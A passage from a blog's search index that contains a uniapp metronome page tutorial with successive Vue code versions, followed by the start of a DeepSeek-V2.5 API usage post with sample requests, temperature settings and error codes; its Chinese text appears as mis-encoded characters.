@change=&quot;handleBeatChange&quot; &gt;&lt;/slider&gt; &lt;!-- é€Ÿåº¦æ˜¾ç¤º --&gt; &lt;view class=&quot;label&quot;&gt;é€Ÿåº¦ï¼š&lt;text class=&quot;value&quot;&gt;&#123;&#123; speed &#125;&#125; BPM&lt;/text&gt;&lt;/view&gt; &lt;!-- å¢åŠ /å‡å°‘é€Ÿåº¦æŒ‰é’® --&gt; &lt;view class=&quot;button-group&quot;&gt; &lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot;&gt;åŠ é€Ÿ&lt;/button&gt; &lt;button class=&quot;button&quot; @click=&quot;decreaseSpeed&quot;&gt;å‡é€Ÿ&lt;/button&gt; &lt;/view&gt; &lt;!-- æ’­æ”¾/åœæ­¢æŒ‰é’® --&gt; &lt;button class=&quot;play-button&quot; @click=&quot;togglePlay&quot;&gt; &#123;&#123; playStatus === &#x27;playing&#x27; ? &#x27;åœæ­¢&#x27; : &#x27;æ’­æ”¾&#x27; &#125;&#125; &lt;/button&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; beat: 4, // åˆå§‹èŠ‚æ‹æ•° speed: 60, // åˆå§‹é€Ÿåº¦ï¼ˆæ¯åˆ†é’ŸèŠ‚æ‹æ•°ï¼‰ playStatus: &#x27;stopped&#x27;, // æ’­æ”¾çŠ¶æ€ï¼Œåˆå§‹ä¸ºåœæ­¢ intervalId: null, // ç”¨äºå­˜å‚¨å®šæ—¶å™¨ID audioContext: null, // éŸ³é¢‘ä¸Šä¸‹æ–‡ &#125;; &#125;, methods: &#123; // åˆå§‹åŒ–éŸ³é¢‘ä¸Šä¸‹æ–‡ initAudio() &#123; if (!this.audioContext) &#123; this.audioContext = uni.createInnerAudioContext(); this.audioContext.src = &#x27;/static/sounds/a1.mp3&#x27;; // æ›¿æ¢ä¸ºèŠ‚æ‹éŸ³æ•ˆæ–‡ä»¶è·¯å¾„ this.audioContext.volume = 1.0; &#125; &#125;, // å¤„ç†æ»‘å—æ”¹å˜èŠ‚æ‹æ•°çš„äº‹ä»¶ handleBeatChange(event) &#123; this.beat = event.detail.value; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.audioContext.play(); // æ’­æ”¾ä¸€æ¬¡éŸ³æ•ˆ &#125; &#125;, // å¢åŠ é€Ÿåº¦çš„æ–¹æ³• increaseSpeed() &#123; this.speed += 5; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.audioContext.play(); // æ’­æ”¾ä¸€æ¬¡éŸ³æ•ˆ &#125; &#125;, // å‡å°‘é€Ÿåº¦çš„æ–¹æ³• decreaseSpeed() &#123; this.speed -= 5; if (this.speed &lt; 5) &#123; this.speed = 5; &#125; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.audioContext.play(); // æ’­æ”¾ä¸€æ¬¡éŸ³æ•ˆ &#125; &#125;, // åˆ‡æ¢æ’­æ”¾/åœæ­¢çŠ¶æ€çš„æ–¹æ³• togglePlay() &#123; if (this.playStatus === &#x27;stopped&#x27;) &#123; this.playStatus = &#x27;playing&#x27;; this.initAudio(); this.startMetronome(); &#125; else &#123; this.playStatus = &#x27;stopped&#x27;; this.stopMetronome(); &#125; &#125;, // å¯åŠ¨èŠ‚æ‹å™¨çš„æ–¹æ³•ï¼Œé€šè¿‡å®šæ—¶å™¨æ’­æ”¾å£°éŸ³ startMetronome() &#123; const intervalTime = 60000 / this.speed; // æ ¹æ®é€Ÿåº¦è®¡ç®—æ¯ä¸ªèŠ‚æ‹çš„é—´éš”æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ this.intervalId = setInterval(() =&gt; &#123; this.audioContext.play(); // æ’­æ”¾éŸ³æ•ˆ &#125;, intervalTime); &#125;, // åœæ­¢èŠ‚æ‹å™¨çš„æ–¹æ³• stopMetronome() &#123; clearInterval(this.intervalId); this.intervalId = null; &#125;, // é‡å¯èŠ‚æ‹å™¨ï¼ˆç”¨äºæ›´æ–°é€Ÿåº¦æˆ–èŠ‚æ‹ï¼‰ restartMetronome() &#123; this.stopMetronome(); // å…ˆåœæ­¢å½“å‰èŠ‚æ‹å™¨ this.startMetronome(); // å†é‡æ–°å¯åŠ¨ &#125;, &#125;, onUnload() &#123; // é¡µé¢å¸è½½æ—¶æ¸…ç†éŸ³é¢‘èµ„æº if (this.audioContext) &#123; this.audioContext.destroy(); &#125; &#125;,&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background-color: #f5f5f5; height: 100vh;&#125;.label &#123; font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;&#125;.value &#123; font-size: 16px; color: #007aff;&#125;.slider &#123; width: 90%; margin: 20px 0;&#125;.button-group &#123; display: flex; gap: 10px; margin-bottom: 20px;&#125;.button &#123; background-color: #007aff; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 16px;&#125;.play-button &#123; background-color: #34c759; color: white; border: none; border-radius: 5px; padding: 15px 30px; font-size: 18px;&#125;.play-button:active &#123; background-color: #32a852;&#125;&lt;/style&gt; åŒºåˆ†ç¬¬ä¸€æ‹&#x2F;å…¶ä½™æ‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- èŠ‚æ‹æ˜¾ç¤º --&gt; &lt;view class=&quot;label&quot;&gt;èŠ‚æ‹ï¼š&lt;text class=&quot;value&quot;&gt;&#123;&#123; beat &#125;&#125;&lt;/text&gt;&lt;/view&gt; &lt;!-- æ»‘å—å®šä¹‰èŠ‚æ‹æ•° --&gt; &lt;slider class=&quot;slider&quot; min=&quot;1&quot; max=&quot;10&quot; step=&quot;1&quot; value=&quot;&#123;&#123; beat &#125;&#125;&quot; @change=&quot;handleBeatChange&quot; &gt;&lt;/slider&gt; &lt;!-- é€Ÿåº¦æ˜¾ç¤º --&gt; &lt;view class=&quot;label&quot;&gt;é€Ÿåº¦ï¼š&lt;text class=&quot;value&quot;&gt;&#123;&#123; speed &#125;&#125; BPM&lt;/text&gt;&lt;/view&gt; &lt;!-- å¢åŠ /å‡å°‘é€Ÿåº¦æŒ‰é’® --&gt; &lt;view class=&quot;button-group&quot;&gt; &lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot;&gt;åŠ é€Ÿ&lt;/button&gt; &lt;button class=&quot;button&quot; @click=&quot;decreaseSpeed&quot;&gt;å‡é€Ÿ&lt;/button&gt; &lt;/view&gt; &lt;!-- æ’­æ”¾/åœæ­¢æŒ‰é’® --&gt; &lt;button class=&quot;play-button&quot; @click=&quot;togglePlay&quot;&gt; &#123;&#123; playStatus === &#x27;playing&#x27;? &#x27;åœæ­¢&#x27; : &#x27;æ’­æ”¾&#x27; &#125;&#125; &lt;/button&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; beat: 4, // åˆå§‹èŠ‚æ‹æ•° speed: 60, // åˆå§‹é€Ÿåº¦ï¼ˆæ¯åˆ†é’ŸèŠ‚æ‹æ•°ï¼‰ playStatus: &#x27;stopped&#x27;, // æ’­æ”¾çŠ¶æ€ï¼Œåˆå§‹ä¸ºåœæ­¢ intervalId: null, // ç”¨äºå­˜å‚¨å®šæ—¶å™¨ID audioContext: null, // éŸ³é¢‘ä¸Šä¸‹æ–‡ &#125;; &#125;, methods: &#123; // åˆå§‹åŒ–éŸ³é¢‘ä¸Šä¸‹æ–‡ initAudio() &#123; if (!this.audioContext) &#123; this.audioContext = uni.createInnerAudioContext(); // å…ˆä¸è®¾ç½®å…·ä½“éŸ³é¢‘æºï¼Œåç»­æ ¹æ®èŠ‚æ‹æ’­æ”¾ä¸åŒéŸ³é¢‘ this.audioContext.volume = 1.0; &#125; &#125;, // å¤„ç†æ»‘å—æ”¹å˜èŠ‚æ‹æ•°çš„äº‹ä»¶ handleBeatChange(event) &#123; this.beat = event.detail.value; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; // æ ¹æ®èŠ‚æ‹æ•°æ’­æ”¾ä¸€æ¬¡ç›¸åº”éŸ³é¢‘ if (this.beat === 4) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; this.audioContext.play(); &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; this.audioContext.play(); &#125; &#125; &#125;, // å¢åŠ é€Ÿåº¦çš„æ–¹æ³• increaseSpeed() &#123; this.speed += 5; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; // æ ¹æ®èŠ‚æ‹æ•°æ’­æ”¾ä¸€æ¬¡ç›¸åº”éŸ³é¢‘ if (this.beat === 4) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; this.audioContext.play(); &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; this.audioContext.play(); &#125; &#125; &#125;, // å‡å°‘é€Ÿåº¦çš„æ–¹æ³• decreaseSpeed() &#123; this.speed -= 5; if (this.speed &lt; 5) &#123; this.speed = 5; &#125; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; // æ ¹æ®èŠ‚æ‹æ•°æ’­æ”¾ä¸€æ¬¡ç›¸åº”éŸ³é¢‘ if (this.beat === 4) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; this.audioContext.play(); &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; this.audioContext.play(); &#125; &#125; &#125;, // åˆ‡æ¢æ’­æ”¾/åœæ­¢çŠ¶æ€çš„æ–¹æ³• togglePlay() &#123; if (this.playStatus === &#x27;stopped&#x27;) &#123; this.playStatus = &#x27;playing&#x27;; this.initAudio(); this.startMetronome(); &#125; else &#123; this.playStatus = &#x27;stopped&#x27;; this.stopMetronome(); &#125; &#125;, // å¯åŠ¨èŠ‚æ‹å™¨çš„æ–¹æ³•ï¼Œé€šè¿‡å®šæ—¶å™¨æ’­æ”¾å£°éŸ³ startMetronome() &#123; const intervalTime = 60000 / this.speed; // æ ¹æ®é€Ÿåº¦è®¡ç®—æ¯ä¸ªèŠ‚æ‹çš„é—´éš”æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ let currentBeat = 1; this.intervalId = setInterval(() =&gt; &#123; if (this.beat === 4 &amp;&amp; currentBeat === 1) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; &#125; this.audioContext.play(); if (currentBeat === this.beat) &#123; currentBeat = 1; &#125; else &#123; currentBeat++; &#125; &#125;, intervalTime); &#125;, // åœæ­¢èŠ‚æ‹å™¨çš„æ–¹æ³• stopMetronome() &#123; clearInterval(this.intervalId); this.intervalId = null; &#125;, // é‡å¯èŠ‚æ‹å™¨ï¼ˆç”¨äºæ›´æ–°é€Ÿåº¦æˆ–èŠ‚æ‹ï¼‰ restartMetronome() &#123; this.stopMetronome(); // å…ˆåœæ­¢å½“å‰èŠ‚æ‹å™¨ this.startMetronome(); // å†é‡æ–°å¯åŠ¨ &#125;, &#125;, onUnload() &#123; // é¡µé¢å¸è½½æ—¶æ¸…ç†éŸ³é¢‘èµ„æº if (this.audioContext) &#123; this.audioContext.destroy(); &#125; &#125;,&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background-color: #f5f5f5; height: 100vh;&#125;.label &#123; font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;&#125;.value &#123; font-size: 16px; color: #007aff;&#125;.slider &#123; width: 90%; margin: 20px 0;&#125;.button-group &#123; display: flex; gap: 10px; margin-bottom: 20px;&#125;.button &#123; background-color: #007aff; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 16px;&#125;.play-button &#123; background-color: #34c759; color: white; border: none; border-radius: 5px; padding: 15px 30px; font-size: 18px;&#125;.play-button:active &#123; background-color: #32a852;&#125;&lt;/style&gt; å®ç°é•¿æŒ‰ + -0123456&lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot; @longpress=&quot;startIncreaseSpeedLongPress&quot; @longpressend=&quot;stopSpeedLongPress&quot; &gt; 123456789101112131415// é•¿æŒ‰å¼€å§‹handleLongPressStart(action) &#123; this.longPressTimer = setInterval(() =&gt; &#123; if (action === &#x27;increase&#x27;) &#123; this.increaseSpeed(); &#125; else if (action === &#x27;decrease&#x27;) &#123; this.decreaseSpeed(); &#125; &#125;, 100); // æ¯100msè§¦å‘ä¸€æ¬¡&#125;,// é•¿æŒ‰ç»“æŸhandleLongPressEnd() &#123; clearInterval(this.longPressTimer); this.longPressTimer = null;&#125;, å®Œæ•´ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- èŠ‚æ‹æ˜¾ç¤º --&gt; &lt;view class=&quot;label&quot;&gt;èŠ‚æ‹ï¼š&lt;text class=&quot;value&quot;&gt;&#123;&#123; beat &#125;&#125;&lt;/text&gt;&lt;/view&gt; &lt;!-- æ»‘å—å®šä¹‰èŠ‚æ‹æ•° --&gt; &lt;slider class=&quot;slider&quot; min=&quot;1&quot; max=&quot;10&quot; step=&quot;1&quot; value=&quot;&#123;&#123; beat &#125;&#125;&quot; @change=&quot;handleBeatChange&quot; &gt;&lt;/slider&gt; &lt;!-- é€Ÿåº¦æ˜¾ç¤º --&gt; &lt;view class=&quot;label&quot;&gt;é€Ÿåº¦ï¼š&lt;text class=&quot;value&quot;&gt;&#123;&#123; speed &#125;&#125; BPM&lt;/text&gt;&lt;/view&gt; &lt;!-- å¢åŠ /å‡å°‘é€Ÿåº¦æŒ‰é’® --&gt; &lt;view class=&quot;button-group&quot;&gt; &lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot; @touchstart=&quot;handleLongPressStart(&#x27;increase&#x27;)&quot; @touchend=&quot;handleLongPressEnd&quot; &gt; åŠ é€Ÿ &lt;/button&gt; &lt;button class=&quot;button&quot; @click=&quot;decreaseSpeed&quot; @touchstart=&quot;handleLongPressStart(&#x27;decrease&#x27;)&quot; @touchend=&quot;handleLongPressEnd&quot; &gt; å‡é€Ÿ &lt;/button&gt; &lt;/view&gt; &lt;!-- æ’­æ”¾/åœæ­¢æŒ‰é’® --&gt; &lt;button class=&quot;play-button&quot; @click=&quot;togglePlay&quot;&gt; &#123;&#123; playStatus === &#x27;playing&#x27; ? &#x27;åœæ­¢&#x27; : &#x27;æ’­æ”¾&#x27; &#125;&#125; &lt;/button&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; beat: 4, // åˆå§‹èŠ‚æ‹æ•° speed: 60, // åˆå§‹é€Ÿåº¦ï¼ˆæ¯åˆ†é’ŸèŠ‚æ‹æ•°ï¼‰ playStatus: &#x27;stopped&#x27;, // æ’­æ”¾çŠ¶æ€ï¼Œåˆå§‹ä¸ºåœæ­¢ intervalId: null, // ç”¨äºå­˜å‚¨å®šæ—¶å™¨ID audioContext: null, // éŸ³é¢‘ä¸Šä¸‹æ–‡ longPressTimer: null, // ç”¨äºé•¿æŒ‰çš„å®šæ—¶å™¨ &#125;; &#125;, methods: &#123; // åˆå§‹åŒ–éŸ³é¢‘ä¸Šä¸‹æ–‡ initAudio() &#123; if (!this.audioContext) &#123; this.audioContext = uni.createInnerAudioContext(); this.audioContext.volume = 1.0; &#125; &#125;, // å¤„ç†æ»‘å—æ”¹å˜èŠ‚æ‹æ•°çš„äº‹ä»¶ handleBeatChange(event) &#123; this.beat = event.detail.value; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.playFirstBeatAudio(); &#125; &#125;, // å¢åŠ é€Ÿåº¦ increaseSpeed() &#123; this.speed += 5; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.playFirstBeatAudio(); &#125; &#125;, // å‡å°‘é€Ÿåº¦ decreaseSpeed() &#123; this.speed -= 5; if (this.speed &lt; 5) &#123; this.speed = 5; &#125; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.playFirstBeatAudio(); &#125; &#125;, // é•¿æŒ‰å¼€å§‹ handleLongPressStart(action) &#123; this.longPressTimer = setInterval(() =&gt; &#123; if (action === &#x27;increase&#x27;) &#123; this.increaseSpeed(); &#125; else if (action === &#x27;decrease&#x27;) &#123; this.decreaseSpeed(); &#125; &#125;, 100); // æ¯100msè§¦å‘ä¸€æ¬¡ &#125;, // é•¿æŒ‰ç»“æŸ handleLongPressEnd() &#123; clearInterval(this.longPressTimer); this.longPressTimer = null; &#125;, // åˆ‡æ¢æ’­æ”¾/åœæ­¢çŠ¶æ€çš„æ–¹æ³• togglePlay() &#123; if (this.playStatus === &#x27;stopped&#x27;) &#123; this.playStatus = &#x27;playing&#x27;; this.initAudio(); this.startMetronome(); &#125; else &#123; this.playStatus = &#x27;stopped&#x27;; this.stopMetronome(); &#125; &#125;, // å¯åŠ¨èŠ‚æ‹å™¨çš„æ–¹æ³•ï¼Œé€šè¿‡å®šæ—¶å™¨æ’­æ”¾å£°éŸ³ startMetronome() &#123; const intervalTime = 60000 / this.speed; // æ ¹æ®é€Ÿåº¦è®¡ç®—æ¯ä¸ªèŠ‚æ‹çš„é—´éš”æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ let currentBeat = 1; this.intervalId = setInterval(() =&gt; &#123; this.playBeatAudio(currentBeat); if (currentBeat === this.beat) &#123; currentBeat = 1; &#125; else &#123; currentBeat++; &#125; &#125;, intervalTime); &#125;, // åœæ­¢èŠ‚æ‹å™¨çš„æ–¹æ³• stopMetronome() &#123; clearInterval(this.intervalId); this.intervalId = null; &#125;, // é‡å¯èŠ‚æ‹å™¨ï¼ˆç”¨äºæ›´æ–°é€Ÿåº¦æˆ–èŠ‚æ‹ï¼‰ restartMetronome() &#123; this.stopMetronome(); this.startMetronome(); &#125;, // æ’­æ”¾ç¬¬ä¸€æ‹éŸ³é¢‘çš„æ–¹æ³• playFirstBeatAudio() &#123; if (this.beat &gt; 0) &#123; if (this.audioContext) &#123; if (this.beat === 1) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; &#125; this.audioContext.play(); &#125; &#125; &#125;, // æ ¹æ®å½“å‰æ‹æ•°æ’­æ”¾éŸ³é¢‘çš„æ–¹æ³• playBeatAudio(currentBeat) &#123; if (this.beat &gt; 0 &amp;&amp; this.audioContext) &#123; if (currentBeat === 1) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; &#125; this.audioContext.play(); &#125; &#125;, &#125;, onUnload() &#123; // é¡µé¢å¸è½½æ—¶æ¸…ç†éŸ³é¢‘èµ„æº if (this.audioContext) &#123; this.audioContext.destroy(); &#125; &#125;,&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background-color: #f5f5f5; height: 100vh;&#125;.label &#123; font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;&#125;.value &#123; font-size: 16px; color: #007aff;&#125;.slider &#123; width: 90%; margin: 20px 0;&#125;.button-group &#123; display: flex; gap: 10px; margin-bottom: 20px;&#125;.button &#123; background-color: #007aff; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 16px;&#125;.play-button &#123; background-color: #34c759; color: white; border: none; border-radius: 5px; padding: 15px 30px; font-size: 18px;&#125;.play-button:active &#123; background-color: #32a852;&#125;&lt;/style&gt;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"uniapp","slug":"uniapp","permalink":"https://banjinmei.github.io/tags/uniapp/"}],"author":"mu"},{"title":"DeepSeek-V2.5","slug":"DeepSeek-V2-5","date":"2024-11-29T19:13:44.000Z","updated":"2025-03-16T16:54:47.206Z","comments":true,"path":"2024/11/30/DeepSeek-V2-5/","permalink":"https://banjinmei.github.io/2024/11/30/DeepSeek-V2-5/","excerpt":"","text":"DeepSeek-V2.5åœ¨ç›®å‰å¤§æ¨¡å‹ä¸»æµæ¦œå•ä¸­ï¼ŒDeepSeek-V2.5 å‡è¡¨ç°å‡ºè‰² ä¸­æ–‡ç»¼åˆèƒ½åŠ›ï¼ˆAlignBenchï¼‰ä½åˆ—å¼€æºæ¦œé¦–ä¸ GPT-4-Turboï¼Œæ–‡å¿ƒ 4.0 ç­‰é—­æºæ¨¡å‹åœ¨è¯„æµ‹ä¸­å¤„äºåŒä¸€æ¢¯é˜Ÿ è‹±æ–‡ç»¼åˆèƒ½åŠ›ï¼ˆMT-Benchï¼‰å¤„äºç¬¬ä¸€æ¢¯é˜Ÿè‹±æ–‡ç»¼åˆèƒ½åŠ›ï¼ˆMT-Benchï¼‰ä¸æœ€å¼ºçš„å¼€æºæ¨¡å‹ LLaMA3-70B å¤„äºåŒä¸€æ¢¯é˜Ÿï¼Œè¶…è¿‡æœ€å¼º MoE å¼€æºæ¨¡å‹ Mixtral8x22B çŸ¥è¯†ã€æ•°å­¦ã€æ¨ç†ã€ç¼–ç¨‹ç­‰æ¦œå•ç»“æœä½å±…å‰åˆ—å¼€æºæ¨¡å‹æ”¯æŒ 128K ä¸Šä¸‹æ–‡ api1234567891011curl https://api.deepseek.com/chat/completions \\ -H &quot;Content-Type: application/json&quot; \\ -H &quot;Authorization: Bearer xx&quot; \\ -d &#x27;&#123; &quot;model&quot;: &quot;deepseek-chat&quot;, &quot;messages&quot;: [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125; ], &quot;stream&quot;: false &#125;&#x27; py123456789101112131415161718# Please install OpenAI SDK first: `pip3 install openai`from openai import OpenAIclient = OpenAI(api_key=&quot;skx&quot;, base_url=&quot;https://api.deepseek.com&quot;)response = client.chat.completions.create( model=&quot;deepseek-chat&quot;, messages=[ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;ä½ å¥½ï¼Œä½ æ˜¯ä»€ä¹ˆå¤§æ¨¡å‹ï¼Ÿä½ èƒ½åšä»€ä¹ˆï¼Ÿ&quot;&#125;, ], stream=False)print(response.choices[0].message.content) node123456789101112131415161718192021// Please install OpenAI SDK first: `npm install openai`import OpenAI from &quot;openai&quot;;const openai = new OpenAI(&#123; baseURL: &#x27;https://api.deepseek.com&#x27;, apiKey: &#x27;xx&#x27;&#125;);async function main() &#123; const completion = await openai.chat.completions.create(&#123; messages: [&#123; role: &quot;system&quot;, content: &quot;You are a helpful assistant.&quot; &#125;], model: &quot;deepseek-chat&quot;, &#125;); console.log(completion.choices[0].message.content);&#125;main(); å¾—åˆ°å›ç­”: 1234567891011ä½ å¥½ï¼æˆ‘æ˜¯ä¸€ä¸ªåŸºäºäººå·¥æ™ºèƒ½æŠ€æœ¯çš„å¤§å‹è¯­è¨€æ¨¡å‹ï¼Œç”±æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰å…¬å¸å¼€å‘ã€‚æˆ‘çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯é€šè¿‡å¤§é‡æ–‡æœ¬æ•°æ®è®­ç»ƒï¼Œèƒ½å¤Ÿç†è§£å’Œç”Ÿæˆè‡ªç„¶è¯­è¨€ï¼Œä»è€ŒååŠ©ç”¨æˆ·è§£ç­”é—®é¢˜ã€æä¾›ä¿¡æ¯ã€è¿›è¡Œå¯¹è¯ç­‰ã€‚æˆ‘èƒ½åšçš„äº‹æƒ…åŒ…æ‹¬ä½†ä¸é™äºï¼š1. **å›ç­”é—®é¢˜**ï¼šæ— è®ºæ˜¯ç§‘å­¦çŸ¥è¯†ã€å†å²äº‹ä»¶ã€æ–‡åŒ–å¸¸è¯†è¿˜æ˜¯æ—¥å¸¸ç”Ÿæ´»ä¸­çš„ç–‘é—®ï¼Œæˆ‘éƒ½å¯ä»¥å°½åŠ›æä¾›å‡†ç¡®çš„ä¿¡æ¯ã€‚2. **æä¾›å»ºè®®**ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘å¯ä»¥æ ¹æ®ä½ çš„éœ€æ±‚æä¾›ä¸€äº›å»ºè®®æˆ–æŒ‡å¯¼ã€‚3. **è¯­è¨€ç¿»è¯‘**ï¼šè™½ç„¶æˆ‘çš„ä¸»è¦è¯­è¨€æ˜¯ä¸­æ–‡ï¼Œä½†æˆ‘ä¹Ÿå¯ä»¥ç†è§£å’Œç”Ÿæˆå…¶ä»–è¯­è¨€çš„æ–‡æœ¬ï¼Œå¸®åŠ©è¿›è¡Œç®€å•çš„ç¿»è¯‘å·¥ä½œã€‚4. **æ–‡æœ¬åˆ›ä½œ**ï¼šæˆ‘å¯ä»¥ååŠ©æ’°å†™æ–‡ç« ã€æ•…äº‹ã€æŠ¥å‘Šç­‰æ–‡æœ¬å†…å®¹ï¼Œæä¾›åˆ›æ„å’Œå†™ä½œæ”¯æŒã€‚5. **å­¦ä¹ è¾…å¯¼**ï¼šåœ¨æ•™è‚²é¢†åŸŸï¼Œæˆ‘å¯ä»¥æä¾›ä¸€äº›åŸºç¡€çš„å­¦ä¹ è¾…å¯¼ï¼Œå¸®åŠ©ç†è§£å¤æ‚çš„æ¦‚å¿µã€‚è¯·æ³¨æ„ï¼Œè™½ç„¶æˆ‘å°½åŠ›æä¾›å‡†ç¡®å’Œæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æˆ‘ä¹Ÿæœ‰å±€é™æ€§ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†éå¸¸ä¸“ä¸šæˆ–æœ€æ–°çš„ä¿¡æ¯æ—¶ã€‚æˆ‘çš„çŸ¥è¯†æˆªæ­¢æ—¥æœŸæ˜¯2023å¹´ï¼Œå› æ­¤å¯¹äºä¹‹åå‘ç”Ÿçš„äº‹ä»¶æˆ–å‘å±•çš„ä¿¡æ¯å¯èƒ½ä¸å‡†ç¡®æˆ–ä¸å®Œæ•´ã€‚ Temperature è®¾ç½®temperature å‚æ•°é»˜è®¤ä¸º 1.0ã€‚ åœºæ™¯ æ¸©åº¦ä»£ç ç”Ÿæˆ&#x2F;æ•°å­¦è§£é¢˜ 0.0æ•°æ®æŠ½å–&#x2F;åˆ†æ 1.0é€šç”¨å¯¹è¯ 1.3ç¿»è¯‘ 1.3åˆ›æ„ç±»å†™ä½œ&#x2F;è¯—æ­Œåˆ›ä½œ 1.5 token å’Œå­—æ•°çš„æ¢ç®—æ¯”1 ä¸ªè‹±æ–‡å­—ç¬¦ â‰ˆ 0.3 ä¸ª tokenã€‚1 ä¸ªä¸­æ–‡å­—ç¬¦ â‰ˆ 0.6 ä¸ª tokenã€‚ é”™è¯¯ç  æè¿°400 - æ ¼å¼é”™è¯¯ åŸå› ï¼šè¯·æ±‚ä½“æ ¼å¼é”™è¯¯è§£å†³æ–¹æ³•ï¼šè¯·æ ¹æ®é”™è¯¯ä¿¡æ¯æç¤ºä¿®æ”¹è¯·æ±‚ä½“401 - è®¤è¯å¤±è´¥ åŸå› ï¼šAPI key é”™è¯¯ï¼Œè®¤è¯å¤±è´¥è§£å†³æ–¹æ³•ï¼šè¯·æ£€æŸ¥æ‚¨çš„ API key æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æ²¡æœ‰ API keyï¼Œè¯·å…ˆ åˆ›å»º API key402 - ä½™é¢ä¸è¶³ åŸå› ï¼šè´¦å·ä½™é¢ä¸è¶³è§£å†³æ–¹æ³•ï¼šè¯·ç¡®è®¤è´¦æˆ·ä½™é¢ï¼Œå¹¶å‰å¾€ å……å€¼ é¡µé¢è¿›è¡Œå……å€¼422 - å‚æ•°é”™è¯¯ åŸå› ï¼šè¯·æ±‚ä½“å‚æ•°é”™è¯¯è§£å†³æ–¹æ³•ï¼šè¯·æ ¹æ®é”™è¯¯ä¿¡æ¯æç¤ºä¿®æ”¹ç›¸å…³å‚æ•°429 - è¯·æ±‚é€Ÿç‡è¾¾åˆ°ä¸Šé™ åŸå› ï¼šè¯·æ±‚é€Ÿç‡ï¼ˆTPM æˆ– RPMï¼‰è¾¾åˆ°ä¸Šé™è§£å†³æ–¹æ³•ï¼šè¯·åˆç†è§„åˆ’æ‚¨çš„è¯·æ±‚é€Ÿç‡ã€‚500 - æœåŠ¡å™¨æ•…éšœ åŸå› 